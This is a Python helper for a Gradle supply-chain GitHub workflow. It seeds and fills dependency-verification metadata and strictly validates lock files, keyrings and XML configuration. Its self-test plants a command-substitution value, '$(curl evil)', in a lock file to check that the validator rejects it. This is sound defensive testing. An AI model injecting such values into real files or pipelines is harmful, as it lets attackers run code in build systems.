#!/usr/bin/env python3
"""Helper of the workflow «Supply chain update» (.github/workflows/supply-chain-update.yml).

Two modes, chosen by the workflow input «signatures»:
  checksums   verify-signatures=false: Gradle checks the sha256 of every artifact.
  signatures  verify-signatures=true: Gradle also checks the PGP signature of every signed artifact against the public
              keys in gradle/verification-keyring.keys (armored, public keys only). Artifacts without a signature, or
              whose key no key server has, keep their sha256 entry (Gradle writes them with the origin «… wasn't
              signed» / «… couldn't be downloaded»; keys that could not be fetched land in <ignored-keys>).

--seed FILE [--signatures]
              writes the starting gradle/verification-metadata.xml (configuration only: verify metadata, signatures
              off or on, sources/javadoc jars trusted for the IDE); Gradle adds the entries.
--fill-checksums FILE CACHE
              signatures mode: adds a sha256 entry for every artifact in the Gradle cache (CACHE = …/files-2.1) that has
              none yet - Gradle omits the checksum of artifacts covered by a trusted key, but the SBOM (sbom.py) needs
              the SHA-256 of every shipped binary. Existing entries stay untouched.
--check DIR [--summary FILE]
              strict check of the handed-over artifact before the publish job commits it: only the expected file
              names (paths relative to android/), regular files, size limits, verification metadata is well-formed
              XML with the expected root and the <configuration> of one of the seeds (verify metadata on, the same
              trusted artifacts); in signatures mode additionally only well-formed <trusted-keys>/<ignored-keys> and a
              keyring with public key blocks only (required), in checksums mode no keys and no keyring. Lock files
              contain only lock lines. Normalises CRLF to LF in place. Exit 1 with an annotation on the first problem.
              --summary appends a Markdown overview (mode, keys, ignored keys, unsigned artifacts) for the job summary.
              Nothing from the artifact is executed.

Usage: python3 -I supply_chain_files.py --seed FILE [--signatures] | --fill-checksums FILE CACHE
                                         | --check DIR [--summary FILE] | --self-test
"""
import hashlib
import os
import re
import stat
import sys
import tempfile
import xml.etree.ElementTree as ET

METADATA = "gradle/verification-metadata.xml"
KEYRING = "gradle/verification-keyring.keys"
LOCKFILES = ("gradle.lockfile", "app/gradle.lockfile", "marketdata/gradle.lockfile", "baselineprofile/gradle.lockfile")
REQUIRED = (METADATA, "app/gradle.lockfile", "marketdata/gradle.lockfile")
MAX_BYTES = {METADATA: 20 * 1024 * 1024, KEYRING: 10 * 1024 * 1024}
MAX_LOCK_BYTES = 2 * 1024 * 1024
NS_URI = "https://schema.gradle.org/dependency-verification"
NS = "{" + NS_URI + "}"
# Configuration names may contain «-» (AGP: _internal-unified-test-platform-…)
LOCK_LINE = re.compile(r"(#.*|empty=[A-Za-z0-9_,\-]*|[A-Za-z0-9_.\-]+:[A-Za-z0-9_.\-]+:[A-Za-z0-9_.+\-]+=[A-Za-z0-9_,\-]*)\Z")
KEY_ID = re.compile(r"[0-9A-Fa-f]{16}([0-9A-Fa-f]{24})?\Z")
SCOPE_ATTRS = {"group", "name", "version", "file", "regex"}
FILLED_ORIGIN = "Added by supply_chain_files.py: signature verified, checksum for the SBOM"
BEGIN_PUBLIC = "-----BEGIN PGP PUBLIC KEY BLOCK-----"
END_PUBLIC = "-----END PGP PUBLIC KEY BLOCK-----"

SEED = """<?xml version="1.0" encoding="UTF-8"?>
<verification-metadata xmlns="https://schema.gradle.org/dependency-verification" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="https://schema.gradle.org/dependency-verification https://schema.gradle.org/dependency-verification/dependency-verification-1.3.xsd">
   <configuration>
      <verify-metadata>true</verify-metadata>
      <verify-signatures>false</verify-signatures>
      <trusted-artifacts>
         <trust file=".*-javadoc[.]jar" regex="true" reason="Android Studio downloads documentation, not part of the build"/>
         <trust file=".*-sources[.]jar" regex="true" reason="Android Studio downloads sources, not part of the build"/>
         <trust group="gradle" name="gradle" file="gradle-.*-src[.]zip" regex="true" reason="Android Studio downloads the Gradle sources, not part of the build"/>
      </trusted-artifacts>
   </configuration>
   <components>
   </components>
</verification-metadata>
"""

# Signatures on; only the armored keyring (verification-keyring.keys) is written and read
SEED_SIGNED = SEED.replace(
    "      <verify-signatures>false</verify-signatures>\n",
    "      <verify-signatures>true</verify-signatures>\n      <keyring-format>armored</keyring-format>\n")


class Invalid(Exception):
    pass


def canonical(element):
    """Element as a comparable tuple: name, sorted attributes, text without whitespace, children in order."""
    return (element.tag, tuple(sorted(element.attrib.items())), (element.text or "").strip(),
            tuple(canonical(child) for child in element))


def seed_configuration(text):
    return canonical(ET.fromstring(text.encode("utf-8")).find(NS + "configuration"))


def check_scope(rel, attrs, where):
    """Scope of a trusted key: known attributes, one group, no match-everything regex."""
    unknown = set(attrs) - SCOPE_ATTRS
    if unknown:
        raise Invalid(f"{rel}: {where}: unexpected attributes {sorted(unknown)}")
    group = attrs.get("group")
    if not group:
        raise Invalid(f"{rel}: {where}: a trusted key needs a group (no key may be trusted for everything)")
    if attrs.get("regex") == "true":
        try:
            broad = re.match(group, "zz.unrelated.check") is not None
        except re.error:
            raise Invalid(f"{rel}: {where}: group is not a valid pattern")
        if broad:
            raise Invalid(f"{rel}: {where}: group pattern matches unrelated groups")


def check_keys(rel, config):
    trusted = config.find(NS + "trusted-keys")
    for key in [] if trusted is None else list(trusted):
        if key.tag != NS + "trusted-key" or not KEY_ID.match(key.get("id", "")):
            raise Invalid(f"{rel}: unexpected entry in <trusted-keys>")
        where = "trusted key " + key.get("id")
        scope = {k: v for k, v in key.attrib.items() if k != "id"}
        children = list(key)
        if any(child.tag != NS + "trusting" for child in children):
            raise Invalid(f"{rel}: {where}: unexpected child element")
        if children:
            if scope:
                raise Invalid(f"{rel}: {where}: attributes and <trusting> together")
            for child in children:
                check_scope(rel, child.attrib, where)
        else:
            check_scope(rel, scope, where)
    ignored = config.find(NS + "ignored-keys")
    for key in [] if ignored is None else list(ignored):
        if key.tag != NS + "ignored-key" or not KEY_ID.match(key.get("id", "")) \
                or set(key.attrib) - {"id", "reason"}:
            raise Invalid(f"{rel}: unexpected entry in <ignored-keys>")


def check_configuration(rel, root):
    """Configuration of one of the two SEEDs; keys only in signature mode. Returns True in signature mode."""
    configs = root.findall(NS + "configuration")
    if len(configs) != 1:
        raise Invalid(f"{rel}: expected exactly one <configuration>")
    config = configs[0]
    verify = config.find(NS + "verify-metadata")
    if verify is None or (verify.text or "").strip() != "true":
        raise Invalid(f"{rel}: verify-metadata must be true")
    signatures_element = config.find(NS + "verify-signatures")
    signed = signatures_element is not None and (signatures_element.text or "").strip() == "true"
    if signed:
        check_keys(rel, config)
        # Section order does not matter (Gradle writes keyring-format in a different place depending on the version)
        rest = sorted(canonical(child) for child in config if child.tag not in (NS + "trusted-keys", NS + "ignored-keys"))
        seed_config = ET.fromstring(SEED_SIGNED.encode("utf-8")).find(NS + "configuration")
        if rest != sorted(canonical(child) for child in seed_config) or config.attrib:
            raise Invalid(f"{rel}: <configuration> differs from the signatures seed (trusted artifacts changed)")
    elif canonical(config) != seed_configuration(SEED):
        raise Invalid(f"{rel}: <configuration> differs from the seed (trusted artifacts or keys changed)")
    return signed


def check_keyring(text):
    if "PRIVATE KEY" in text:
        raise Invalid(f"{KEYRING}: contains a private key block")
    begins, ends = text.count(BEGIN_PUBLIC), text.count(END_PUBLIC)
    if begins == 0 or begins != ends:
        raise Invalid(f"{KEYRING}: expected complete armored public key blocks")
    if len(re.findall(r"-----BEGIN [A-Z ]+-----", text)) != begins:
        raise Invalid(f"{KEYRING}: unexpected armored block (only public keys allowed)")


def seed(path, signatures=False):
    os.makedirs(os.path.dirname(path) or ".", exist_ok=True)
    with open(path, "w", encoding="utf-8", newline="\n") as f:
        f.write(SEED_SIGNED if signatures else SEED)


def sha256_of(path):
    digest = hashlib.sha256()
    with open(path, "rb") as f:
        for block in iter(lambda: f.read(1 << 20), b""):
            digest.update(block)
    return digest.hexdigest()


def fill_checksums(path, cache):
    """Adds sha256 from the Gradle cache (<group>/<name>/<version>/<hash>/<file>); returns the number of new entries."""
    ET.register_namespace("", NS_URI)
    ET.register_namespace("xsi", "http://www.w3.org/2001/XMLSchema-instance")
    tree = ET.parse(path)
    components = tree.getroot().find(NS + "components")
    if components is None:
        raise Invalid(f"{path}: no <components>")
    index = {(c.get("group"), c.get("name"), c.get("version")): c for c in components.findall(NS + "component")}
    added = 0
    for base, _, files in sorted(os.walk(cache)):
        parts = os.path.relpath(base, cache).split(os.sep)
        if len(parts) != 4:
            continue
        key = tuple(parts[:3])
        for name in sorted(files):
            if name.endswith(".asc"):
                continue
            component = index.get(key)
            if component is None:
                component = ET.SubElement(components, NS + "component",
                                          {"group": key[0], "name": key[1], "version": key[2]})
                index[key] = component
            artifact = next((a for a in component.findall(NS + "artifact") if a.get("name") == name), None)
            if artifact is None:
                artifact = ET.SubElement(component, NS + "artifact", {"name": name})
            if artifact.find(NS + "sha256") is None:
                ET.SubElement(artifact, NS + "sha256",
                              {"value": sha256_of(os.path.join(base, name)), "origin": FILLED_ORIGIN})
                added += 1
    components[:] = sorted(components, key=lambda c: (c.get("group"), c.get("name"), c.get("version")))
    ET.indent(tree, space="   ")
    with open(path, "wb") as f:
        tree.write(f, encoding="UTF-8", xml_declaration=True)
        f.write(b"\n")
    return added


def summary(root, signed, keyring_text):
    lines = [f"### Supply chain files: {'signatures' if signed else 'checksums only'}", ""]
    components = root.find(NS + "components")
    lines.append(f"* Components: {0 if components is None else len(components)}")
    if not signed:
        return lines
    config = root.find(NS + "configuration")
    trusted = config.find(NS + "trusted-keys")
    ignored = config.find(NS + "ignored-keys")
    lines.append(f"* Trusted keys: {0 if trusted is None else len(trusted)}; "
                 f"keyring blocks: {keyring_text.count(BEGIN_PUBLIC)}")
    unsigned = []
    for sha in root.iter(NS + "sha256"):
        origin = sha.get("origin", "")
        if "signed" in origin or "downloaded" in origin:
            unsigned.append(origin)
    lines.append(f"* Artifacts checked by sha256 only (no signature or key not available): {len(unsigned)}")
    for key in [] if ignored is None else list(ignored):
        lines.append(f"* Ignored key `{key.get('id')}`: {key.get('reason', 'no reason given')}")
    return lines


def listing(directory):
    found = []
    for base, dirs, files in os.walk(directory):
        for name in dirs + files:
            full = os.path.join(base, name)
            mode = os.lstat(full).st_mode
            rel = os.path.relpath(full, directory).replace(os.sep, "/")
            if stat.S_ISLNK(mode):
                raise Invalid(f"{rel}: links are not allowed")
            if stat.S_ISREG(mode):
                found.append(rel)
            elif not stat.S_ISDIR(mode):
                raise Invalid(f"{rel}: not a regular file")
    return sorted(found)


def read_text(directory, rel):
    path = os.path.join(directory, rel)
    limit = MAX_BYTES.get(rel, MAX_LOCK_BYTES)
    if os.path.getsize(path) > limit:
        raise Invalid(f"{rel}: larger than {limit} bytes")
    with open(path, "rb") as f:
        data = f.read()
    try:
        return data.decode("utf-8").replace("\r\n", "\n")
    except UnicodeDecodeError:
        raise Invalid(f"{rel}: not UTF-8")


def check(directory, summary_lines=None):
    files = listing(directory)
    allowed = {METADATA, KEYRING, *LOCKFILES}
    for rel in files:
        if rel not in allowed:
            raise Invalid(f"unexpected file in artifact: {rel}")
    for rel in REQUIRED:
        if rel not in files:
            raise Invalid(f"missing file: {rel}")
    texts = {rel: read_text(directory, rel) for rel in files}
    try:
        root = ET.fromstring(texts[METADATA].encode("utf-8"))
    except ET.ParseError as exc:
        raise Invalid(f"{METADATA}: not well-formed XML ({exc})")
    if root.tag != NS + "verification-metadata":
        raise Invalid(f"{METADATA}: unexpected root element {root.tag}")
    signed = check_configuration(METADATA, root)
    components = root.find(NS + "components")
    if components is None or len(components) == 0:
        raise Invalid(f"{METADATA}: no components (Gradle wrote no checksums)")
    if signed and KEYRING not in texts:
        raise Invalid(f"missing file: {KEYRING} (signatures mode)")
    if not signed and KEYRING in texts:
        raise Invalid(f"{KEYRING}: not expected in checksums mode")
    if KEYRING in texts:
        check_keyring(texts[KEYRING])
    for rel, text in texts.items():
        if rel in (METADATA, KEYRING):
            continue
        lines = [line for line in text.split("\n") if line]
        if not any(not line.startswith("#") for line in lines):
            raise Invalid(f"{rel}: no lock entries")
        for number, line in enumerate(lines, 1):
            if not LOCK_LINE.match(line):
                raise Invalid(f"{rel}:{number}: unexpected line")
    for rel, text in texts.items():
        with open(os.path.join(directory, rel), "w", encoding="utf-8", newline="\n") as f:
            f.write(text)
    if summary_lines is not None:
        summary_lines.extend(summary(root, signed, texts.get(KEYRING, "")))
    return files


def expect_invalid(directory, expected):
    try:
        check(directory)
    except Invalid as exc:
        assert expected in str(exc), (expected, str(exc))
        return
    raise AssertionError(f"must be rejected: {expected}")


def write(path, text):
    os.makedirs(os.path.dirname(path), exist_ok=True)
    with open(path, "w", encoding="utf-8", newline="") as f:
        f.write(text)


def self_test():
    with tempfile.TemporaryDirectory() as tmp:
        seed(os.path.join(tmp, METADATA))
        lock = "# Gradle lock file\nandroidx.core:core:1.19.1=releaseRuntimeClasspath,_internal-utp-x\nempty=\n"
        for rel in ("app/gradle.lockfile", "marketdata/gradle.lockfile"):
            write(os.path.join(tmp, rel), lock.replace("\n", "\r\n"))
        expect_invalid(tmp, "no components")
        component = '<components><component group="a" name="b" version="1"/>'
        write(os.path.join(tmp, METADATA), SEED.replace("<components>", component))
        assert check(tmp) == ["app/gradle.lockfile", METADATA, "marketdata/gradle.lockfile"]
        with open(os.path.join(tmp, "app/gradle.lockfile"), "rb") as f:
            assert b"\r" not in f.read()
        write(os.path.join(tmp, "app/build.gradle.kts"), "x")
        expect_invalid(tmp, "unexpected file")
        os.remove(os.path.join(tmp, "app/build.gradle.kts"))
        good = SEED.replace("<components>", component)
        # The same configuration with different whitespace and attribute order stays valid
        same = good.replace('<trust file=".*-javadoc[.]jar" regex="true"', '<trust   regex="true" file=".*-javadoc[.]jar"')
        key = "0123456789ABCDEF0123456789ABCDEF01234567"
        configuration_cases = [
            (same, None),
            (good.replace("<verify-metadata>true", "<verify-metadata>false"), "verify-metadata must be true"),
            (good.replace("   <configuration>\n      <verify-metadata>true</verify-metadata>\n", "   <configuration>\n"),
             "verify-metadata must be true"),
            (good.replace("</trusted-artifacts>", '<trust group="com.evil"/></trusted-artifacts>'), "differs from the seed"),
            (good.replace(".*-sources[.]jar", ".*"), "differs from the seed"),
            (good.replace("</configuration>", f'<trusted-keys><trusted-key id="{key}" group="x"/></trusted-keys>'
                          "</configuration>"), "differs from the seed"),
            (good.replace("</configuration>", '<ignored-keys><ignored-key id="ABCD"/></ignored-keys></configuration>'),
             "differs from the seed"),
            (good.replace("<verify-signatures>false", "<verify-signatures>true"), "differs from the signatures seed"),
            (good.replace("<components>", "<configuration/><components>"), "exactly one <configuration>"),
        ]
        for xml, expected in configuration_cases:
            write(os.path.join(tmp, METADATA), xml)
            if expected is None:
                check(tmp)
            else:
                expect_invalid(tmp, expected)
        write(os.path.join(tmp, METADATA), good)
        write(os.path.join(tmp, KEYRING), f"pub {key[-16:]}\n{BEGIN_PUBLIC}\nabc\n{END_PUBLIC}\n")
        expect_invalid(tmp, "not expected in checksums mode")
        self_test_signatures(tmp, key, component)
        os.remove(os.path.join(tmp, KEYRING))
        write(os.path.join(tmp, METADATA), good)
        with open(os.path.join(tmp, "marketdata/gradle.lockfile"), "a", encoding="utf-8") as f:
            f.write("$(curl evil)\n")
        expect_invalid(tmp, "unexpected line")
        self_test_fill(tmp)
    print("supply_chain_files self-test ok")
    return 0


def self_test_signatures(tmp, key, component):
    signed = SEED_SIGNED.replace("<components>", component + '<component group="u" name="v" version="2">'
                                 '<artifact name="v-2.jar"><sha256 value="00" origin="Generated by Gradle because'
                                 ' artifact wasn\'t signed"/></artifact></component>')
    keys = (f'<trusted-keys><trusted-key id="{key}" group="^androidx($|([.].*))" regex="true"/>'
            f'<trusted-key id="{key[:16]}"><trusting group="org.jetbrains"/><trusting group="com.squareup"/>'
            '</trusted-key></trusted-keys><ignored-keys><ignored-key id="FEDCBA9876543210" reason="Key couldn\'t be'
            ' downloaded from any key server"/></ignored-keys></configuration>')
    valid = signed.replace("</configuration>", keys)
    moved = valid.replace("      <keyring-format>armored</keyring-format>\n", "").replace(
        "</trusted-artifacts>", "</trusted-artifacts><keyring-format>armored</keyring-format>")
    write(os.path.join(tmp, METADATA), moved)
    check(tmp)
    write(os.path.join(tmp, METADATA), valid)
    lines = []
    check(tmp, lines)
    text = "\n".join(lines)
    assert "signatures" in text and "Trusted keys: 2" in text and "sha256 only" in text and ": 1" in text, text
    assert "FEDCBA9876543210" in text, text
    cases = [
        (valid.replace('group="org.jetbrains"', 'group=".*" regex="true"'), "matches unrelated groups"),
        (valid.replace(' group="^androidx($|([.].*))" regex="true"', ""), "needs a group"),
        (valid.replace(f'id="{key}"', 'id="xyz"'), "unexpected entry in <trusted-keys>"),
        (valid.replace('reason="Key', 'extra="1" reason="Key'), "unexpected entry in <ignored-keys>"),
        (valid.replace("<keyring-format>armored</keyring-format>", ""), "differs from the signatures seed"),
        (valid.replace("<keyring-format>armored</keyring-format>", "<keyring-format>binary</keyring-format>"),
         "differs from the signatures seed"),
        (valid.replace("</trusted-artifacts>", '<trust group="com.evil"/></trusted-artifacts>'),
         "differs from the signatures seed"),
    ]
    for xml, expected in cases:
        write(os.path.join(tmp, METADATA), xml)
        expect_invalid(tmp, expected)
    write(os.path.join(tmp, METADATA), valid)
    keyring = os.path.join(tmp, KEYRING)
    with open(keyring, encoding="utf-8") as f:
        good_keyring = f.read()
    for text, expected in [("pub x\n", "complete armored public key blocks"),
                           (good_keyring + "-----BEGIN PGP PRIVATE KEY BLOCK-----\n", "private key"),
                           (good_keyring + "-----BEGIN PGP MESSAGE-----\n", "only public keys")]:
        write(keyring, text)
        expect_invalid(tmp, expected)
    os.remove(keyring)
    expect_invalid(tmp, "signatures mode")
    write(keyring, good_keyring)


def self_test_fill(tmp):
    metadata = os.path.join(tmp, "fill.xml")
    write(metadata, SEED_SIGNED.replace("<components>", '<components><component group="a" name="b" version="1">'
                                        '<artifact name="b-1.jar"><sha256 value="keep" origin="x"/></artifact>'
                                        '</component>'))
    cache = os.path.join(tmp, "files-2.1")
    for rel, data in [("a/b/1/h1/b-1.jar", b"old"), ("a/b/1/h2/b-1.pom", b"pom"), ("c/d/2/h3/d-2.aar", b"aar"),
                      ("c/d/2/h4/d-2.aar.asc", b"sig")]:
        os.makedirs(os.path.dirname(os.path.join(cache, rel)), exist_ok=True)
        with open(os.path.join(cache, rel), "wb") as f:
            f.write(data)
    assert fill_checksums(metadata, cache) == 2
    root = ET.parse(metadata).getroot()
    values = {(c.get("name"), a.get("name")): a.find(NS + "sha256").get("value")
              for c in root.iter(NS + "component") for a in c.findall(NS + "artifact")}
    assert values == {("b", "b-1.jar"): "keep", ("b", "b-1.pom"): hashlib.sha256(b"pom").hexdigest(),
                      ("d", "d-2.aar"): hashlib.sha256(b"aar").hexdigest()}, values
    assert root.find(NS + "configuration").find(NS + "keyring-format").text == "armored"
    with open(metadata, encoding="utf-8") as f:
        assert "ns0:" not in f.read()
    assert fill_checksums(metadata, cache) == 0


def main(argv):
    if argv == ["--self-test"]:
        return self_test()
    if argv[:1] == ["--seed"] and len(argv) in (2, 3) and argv[2:] in ([], ["--signatures"]):
        seed(argv[1], signatures=len(argv) == 3)
        return 0
    if len(argv) == 3 and argv[0] == "--fill-checksums":
        print(f"Added {fill_checksums(argv[1], argv[2])} checksums")
        return 0
    if argv[:1] == ["--check"] and (len(argv) == 2 or (len(argv) == 4 and argv[2] == "--summary")):
        lines = []
        try:
            files = check(argv[1], lines)
        except Invalid as exc:
            print(f"::error title=Supply chain artifact::{exc}")
            return 1
        print("Checked: " + ", ".join(files))
        if len(argv) == 4:
            with open(argv[3], "a", encoding="utf-8") as f:
                f.write("\n".join(lines) + "\n")
        return 0
    print(__doc__)
    return 2


if __name__ == "__main__":
    sys.exit(main(sys.argv[1:]))
